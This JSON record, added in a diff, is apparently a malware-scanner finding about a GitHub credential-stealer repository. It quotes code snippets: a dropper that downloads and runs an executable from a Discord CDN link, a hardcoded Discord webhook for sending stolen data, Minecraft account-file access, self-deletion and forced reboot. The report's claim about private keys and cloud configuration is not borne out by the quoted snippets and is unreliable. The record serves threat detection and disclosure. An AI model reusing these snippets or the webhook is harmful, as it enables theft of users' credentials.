@@ -1,0 +1,192 @@
+{
+  "finding": {
+    "key": "repository:mulagoto/vespy-grabber-v2.0",
+    "kind": "repository",
+    "id": "mulagoto/vespy-grabber-v2.0",
+    "url": "https://github.com/mulagoto/vespy-grabber-V2.0",
+    "registry": "github",
+    "owner": "mulagoto",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 17,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "credential_access/env-dump; credential_access/mc-launcher-accounts; network_exfil/discord-webhook; code_execution/py-system",
+    "evidence_locations": "utils/Wallets.py:24; utils/VPNstealer.py:9; vespygrabber2.0.py:731; vespygrabber2.0.py:24; vespygrabber2.0.py:123; vespygrabber2.0.py:191; vespygrabber2.0.py:192; vespygrabber2.0.py:193; vespygrabber2.0.py:194; vespygrabber2.0.py:811; vespygrabber2.0.py:865; utils/Wallets.py:100; utils/VPNstealer.py:25; utils/Reboot.py:4; utils/N3ke.py:29; utils/N3ke.py:42",
+    "c2_hosts": "discord.com",
+    "iocs": "discord.com; https://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/p; https://discord.com/api/webhooks/1134182846341320824/SDMezD8gjL4mAbh41pFYSxcFonc3UYlFBLIMwQzGZbzZJNI9jrkvxlKba6tT9mCO85CM; utils/Wallets.py",
+    "matched_signatures": "\"launcher_accounts.json\" \"api/webhooks\"",
+    "reasons": "Shares a confirmed-malware code signature ['\"launcher_accounts.json\" \"api/webhooks\"'] | Tier-2 confirmed (bash score 13)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
+    "evidence_file": "repositories/mulagoto_vespy-grabber-v2.0.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "utils/Wallets.py",
+      "line": 24,
+      "category": "credential_access",
+      "rule": "env-dump",
+      "snippet": "else:open(os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\",\"procvesp111.exe\"),\"wb\").write(requests.get(\"https://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/p"
+    },
+    {
+      "file": "utils/VPNstealer.py",
+      "line": 9,
+      "category": "credential_access",
+      "rule": "env-dump",
+      "snippet": "else:open(os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\",\"procvesp111.exe\"),\"wb\").write(requests.get(\"https://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/p"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 731,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "self.accounts_path = \"\\\\.minecraft\\\\launcher_accounts.json\""
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 24,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1134182846341320824/SDMezD8gjL4mAbh41pFYSxcFonc3UYlFBLIMwQzGZbzZJNI9jrkvxlKba6tT9mCO85CM', 'ping': True, 'pingtype': 'Everyone', 'error': Tru"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 24,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1134182846341320824/SDMezD8gjL4mAbh41pFYSxcFonc3UYlFBLIMwQzGZbzZJNI9jrkvxlKba6tT9mCO85CM', 'ping': True, 'pingtype': 'Everyone', 'error': Tru"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 123,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "subprocess.run(cmd, shell=True, capture_output=True)"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 191,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 192,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "cpu = subprocess.run([\"wmic\", \"cpu\", \"get\", \"Name\"], capture_output=True, text=True).stdout.strip().split('\\n')[2]"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 193,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "gpu = subprocess.run(\"wmic path win32_VideoController get name\", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 194,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 731,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "self.accounts_path = \"\\\\.minecraft\\\\launcher_accounts.json\""
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 811,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "subprocess.Popen('ping localhost -n 3 > NUL && del /F \"{}\"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)"
+    },
+    {
+      "file": "vespygrabber2.0.py",
+      "line": 865,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "subprocess.call([update, '--processStart', executable],"
+    },
+    {
+      "file": "utils/Wallets.py",
+      "line": 24,
+      "category": "credential_access",
+      "rule": "env-dump",
+      "snippet": "else:open(os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\",\"procvesp111.exe\"),\"wb\").write(requests.get(\"https://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/p"
+    },
+    {
+      "file": "utils/Wallets.py",
+      "line": 100,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "subprocess.run([os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\",\"procvesp111.exe\"), '-accepteula','-ma', str(procID), os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\","
+    },
+    {
+      "file": "utils/VPNstealer.py",
+      "line": 9,
+      "category": "credential_access",
+      "rule": "env-dump",
+      "snippet": "else:open(os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\",\"procvesp111.exe\"),\"wb\").write(requests.get(\"https://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/p"
+    },
+    {
+      "file": "utils/VPNstealer.py",
+      "line": 25,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "subprocess.run([os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\",\"procvesp111.exe\"), '-accepteula','-ma', str(procID), os.path.join(os.environ[\"USERPROFILE\"], \"AppData\",\"Local\",\"Temp\","
+    },
+    {
+      "file": "utils/Reboot.py",
+      "line": 4,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system(\"shutdown /r /t 1\")"
+    },
+    {
+      "file": "utils/N3ke.py",
+      "line": 29,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system(fr'C:\\Users\\{user}\\AppData\\Local\\Temp\\H7nv.vbs')"
+    },
+    {
+      "file": "utils/N3ke.py",
+      "line": 42,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system(fr'C:\\Users\\{user}\\AppData\\Local\\Temp\\l4gY.vbs')"
+    }
+  ],
+  "commit_sha": "e6a0d19bf43b0d02b80f95532426a38e421444cc",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/mulagoto/vespy-grabber-v2.0",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file utils/Wallets.py around line 24. The code reaches into credential files such as private keys and cloud configuration to steal authentication material. The same dropper is planted in 2 separate directories in this repository, so it runs whichever of them the victim opens: utils/VPNstealer.py, utils/Wallets.py. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: \"launcher_accounts.json\" \"api/webhooks\".",
+    "payload_description": "The malicious payload sits in utils/Wallets.py at line 24. The code reaches into credential files such as private keys and cloud configuration to steal authentication material. Detection rules that fired in this repository: code_execution/py-system (5 files), credential_access/env-dump (2 files), credential_access/mc-launcher-accounts (1 file), network_exfil/discord-webhook (1 file).",
+    "publisher": "mulagoto",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "minecraft-account-stealer",
+      "credential-theft"
+    ],
+    "evidence_references": "https://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/utils/Wallets.py#L24\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/utils/VPNstealer.py#L9\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L731\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L24\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L123\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L191\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L192\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L193\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L194\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L811\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/vespygrabber2.0.py#L865\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/utils/Wallets.py#L100\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/utils/VPNstealer.py#L25\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/utils/Reboot.py#L4\nhttps://github.com/mulagoto/vespy-grabber-v2.0/blob/e6a0d19bf43b0d02b80f95532426a38e421444cc/utils/N3ke.py#L29",
+    "verified_iocs": "discord.com\nhttps://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/p\nhttps://discord.com/api/webhooks/1134182846341320824/SDMezD8gjL4mAbh41pFYSxcFonc3UYlFBLIMwQzGZbzZJNI9jrkvxlKba6tT9mCO85CM\nutils/Wallets.py",
+    "contributors": [],
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
+  }
+}
